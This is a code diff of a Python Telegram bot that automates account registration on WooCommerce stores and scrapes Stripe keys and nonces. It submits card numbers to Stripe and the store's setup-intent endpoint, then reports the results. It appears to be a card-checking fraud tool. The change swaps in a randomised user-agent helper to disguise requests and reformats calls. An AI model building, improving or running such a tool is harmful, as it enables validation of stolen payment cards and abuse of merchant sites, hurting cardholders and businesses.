@@ -5,7 +5,7 @@ import string
 import re
 import html
 import time
-from fake_useragent import UserAgent
+from user_agents import get_random_user_agent
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import Application, CommandHandler, ContextTypes
@@ -71,7 +71,7 @@ def register_new_account(register_url: str, session: requests.Session = None):
     """
     sess = session or requests.Session()
     headers = {
-        "User-Agent": UserAgent().random,
+        "User-Agent": get_random_user_agent(),
         "Referer": register_url,
         "Content-Type": "application/x-www-form-urlencoded"
     }
@@ -103,7 +103,7 @@ def find_pk(payment_url: str, session: requests.Session = None) -> str | None:
     """
     sess = session or requests.Session()
     try:
-        headers = {"User-Agent": UserAgent().random}
+        headers = {"User-Agent": get_random_user_agent()}
         resp = sess.get(payment_url, headers=headers, timeout=15)
         text = resp.text
     except Exception as e:
@@ -255,7 +255,7 @@ def send_card_to_stripe(session: requests.Session, pk: str, card: str):
     if yy.startswith("20"):
         yy = yy[2:]
 
-    headers = {"User-Agent": UserAgent().random, "Referer": ""}  # referer set later when known
+    headers = {"User-Agent": get_random_user_agent(), "Referer": ""}  # referer set later when known
 
     # 1) Create payment method on Stripe
     stripe_payload = {
@@ -283,7 +283,11 @@ def send_card_to_stripe(session: requests.Session, pk: str, card: str):
     # 2) Get nonce from payment page (must fetch full payment_url page so referer and cookies align)
     logger.debug("[DEBUG] Retrieving nonce from payment page HTML")
     try:
-        html_text = session.get(session.payment_page_url, headers={"User-Agent": UserAgent().random}, timeout=15).text
+        html_text = session.get(
+            session.payment_page_url,
+            headers={"User-Agent": get_random_user_agent()},
+            timeout=15,
+        ).text
     except Exception as e:
         return {"error": "Failed to fetch payment page for nonce", "raw": str(e)}
 
@@ -306,9 +310,17 @@ def send_card_to_stripe(session: requests.Session, pk: str, card: str):
         '_ajax_nonce': nonce,
     }
 
-    payment_intent_url = session.payment_page_url.replace('/add-payment-method/', '/?wc-ajax=wc_stripe_create_and_confirm_setup_intent')
+    payment_intent_url = session.payment_page_url.replace(
+        '/add-payment-method/',
+        '/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
+    )
     logger.debug(f"[DEBUG] Sending final request to {payment_intent_url}")
-    final_resp = session.post(payment_intent_url, headers={"User-Agent": UserAgent().random, "Referer": session.payment_page_url}, data=data_final, timeout=25)
+    final_resp = session.post(
+        payment_intent_url,
+        headers={"User-Agent": get_random_user_agent(), "Referer": session.payment_page_url},
+        data=data_final,
+        timeout=25,
+    )
 
     try:
         final_json = final_resp.json()
@@ -349,7 +361,7 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         # Step 1: Check if site reachable
         start_time = time.time()
-        r = requests.get(base, headers={"User-Agent": UserAgent().random}, timeout=15)
+        r = requests.get(base, headers={"User-Agent": get_random_user_agent()}, timeout=15)
         response_time = time.time() - start_time
         if r.status_code >= 400:
             await progress_msg.edit_text(f"❌ Failed fetching {html_escape(base)} (status {r.status_code})", parse_mode=ParseMode.HTML)
@@ -366,7 +378,11 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         # Step 3: Fetch payment page
         await progress_msg.edit_text(" Payment gateways...", parse_mode=ParseMode.HTML)
-        page_html = session.get(session.payment_page_url, headers={"User-Agent": UserAgent().random}, timeout=15).text
+        page_html = session.get(
+            session.payment_page_url,
+            headers={"User-Agent": get_random_user_agent()},
+            timeout=15,
+        ).text
         page_info = analyze_site_page(page_html)
 
         # Step 4: Find PK
